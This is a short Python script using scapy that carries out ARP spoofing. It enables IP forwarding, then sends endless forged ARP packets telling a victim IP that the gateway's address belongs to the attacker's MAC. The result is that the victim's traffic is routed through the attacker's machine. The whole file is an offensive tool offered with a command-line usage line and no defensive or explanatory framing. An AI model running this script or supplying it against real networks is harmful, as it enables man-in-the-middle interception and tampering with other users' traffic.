#!/usr/bin/python3

from ast import ExceptHandler
from struct import pack
from scapy.all import *

import sys
import os

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac_addr():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "ff:ff:ff:ff:ff:ff"):
            return mac

Timeout = 2

if len(sys.argv) !=3:
    print("\nUse IP_ATTACK IP_GATEWAY in follow IP_GATEWAY IP_ATTACK")
    sys.exit(1)

my_mac = get_mac_addr()
if not my_mac:
    print("Is not possible get MAC")
    sys.exit(1)

packet = Ether()/ARP(op="who-has", hwsrc=my_mac,psrc=sys.argv[2], pdst=sys.argv[1])

while True:
    srp(packet)